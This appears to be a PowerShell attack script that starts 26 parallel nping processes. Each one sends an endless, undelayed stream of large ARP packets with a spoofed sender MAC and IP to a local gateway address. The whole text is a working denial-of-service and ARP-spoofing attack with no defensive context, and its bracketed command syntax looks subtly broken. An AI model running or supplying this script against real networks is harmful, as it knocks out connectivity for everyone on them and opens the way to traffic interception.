for($i = 0; $i -le 25; $i++) {

  start powershell -command { [nping --arp --arp-type arp --arp-sender-mac E8:39:35:2A:CD:CC --arp-sender-ip 192.168.0.2 --source-ip 192.168.0.2 --arp-target-mac F0:84:2F:AF:AE:43 --arp-target-ip 192.168.0.1 --dest-ip 192.168.0.1 --data-length 64000 --delay 0 -c 0 --quiet] };


}